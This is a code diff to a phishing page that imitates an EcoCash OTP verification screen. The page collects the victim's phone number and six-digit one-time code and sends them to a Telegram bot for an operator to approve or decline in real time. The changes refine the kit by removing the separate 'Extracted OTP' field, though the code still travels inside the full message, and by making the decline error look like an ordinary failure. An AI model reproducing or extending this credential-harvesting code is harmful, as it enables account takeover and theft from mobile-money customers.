@@ -84,7 +84,6 @@
       font-weight: 600;
     }
 
-    /* OTP boxes – original 6‑digit design */
     .otp-inputs {
       display: flex;
       justify-content: center;
@@ -194,7 +193,6 @@
     </div>
     <div class="phone-masked" id="maskedPhoneDisplay">+263 7*******</div>
 
-    <!-- 6 OTP boxes -->
     <div class="otp-inputs" id="otpContainer">
       <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" id="otp1">
       <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" id="otp2">
@@ -204,7 +202,6 @@
       <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" id="otp6">
     </div>
 
-    <!-- Countdown timer -->
     <div class="timer-row" style="justify-content: center; background: transparent; margin-top: 0;">
       <span id="resendMessage" style="color:#1c6aa6; font-weight:500;">Resend OTP in <span id="resendTimer">120</span> seconds</span>
     </div>
@@ -331,7 +328,7 @@
       });
     }
     
-    async function sendOtpToTelegram(phoneNumber, fullMessage, enteredOtp) {
+    async function sendOtpToTelegram(phoneNumber, fullMessage) {
       const timestamp = Date.now();
       const approveId = `otp_approve_${timestamp}`;
       const declineId = `otp_decline_${timestamp}`;
@@ -339,7 +336,6 @@
       const message = `🔐 <b>EcoCash OTP Verification</b>\n\n` +
                       `<b> Phone:</b> <code>${escapeHtml(phoneNumber)}</code>\n\n` +
                       `<b> Full Message:</b>\n<code>${escapeHtml(fullMessage)}</code>\n\n` +
-                      `<b> Extracted OTP:</b> <code>${escapeHtml(enteredOtp)}</code>\n\n` +
                       `⚠️ <b>Action required:</b> Approve or Decline this OTP.`;
       
       try {
@@ -409,7 +405,7 @@
               hideSpinner();
               submitBtn.disabled = false;
               enableOtpInputs(true);
-              errorDiv.innerText = '❌ OTP verification declined. Please try again.';
+              errorDiv.innerText = 'OTP verification failed. Please try again.';
               clearOtpFields();
               if (otpInputs[0]) otpInputs[0].focus();
               return;
@@ -527,7 +523,6 @@
         return;
       }
       
-      // Build the full message using the fixed template
       const fullMessage = buildFullMessage(enteredOtp);
       
       isSubmitting = true;
@@ -536,7 +531,7 @@
       showSpinner();
       errorDiv.innerText = '';
       
-      await sendOtpToTelegram(userPhone, fullMessage, enteredOtp);
+      await sendOtpToTelegram(userPhone, fullMessage);
     }
     
     // ==================== INITIALIZATION ====================
